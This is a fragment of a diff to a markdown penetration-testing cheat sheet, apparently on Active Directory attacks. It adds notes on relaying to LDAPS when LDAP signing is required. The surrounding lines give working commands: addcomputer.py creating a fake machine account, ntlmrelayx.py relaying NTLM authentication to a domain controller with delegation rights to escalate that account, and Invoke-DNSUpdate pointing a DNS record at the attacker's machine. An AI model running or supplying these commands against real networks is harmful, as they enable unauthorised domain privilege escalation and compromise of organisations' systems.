@@ -1162,6 +1162,7 @@ python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<U
 ```
 
 #### Start NTLMRelay
+- Or use `ldaps://<DC IP>` if it doesn't require binding and ldap requires signing
 ```
 sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
 ```
@@ -1234,7 +1235,7 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 - Didn't test dnstool for this attack
 
 #### Start NTLMRelay
-- Can either relay to `ldap` or `ldaps`
+- Or use `ldaps://<DC IP>` if it doesn't require binding and ldap requires signing
 ```
 sudo python3 ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
 ```
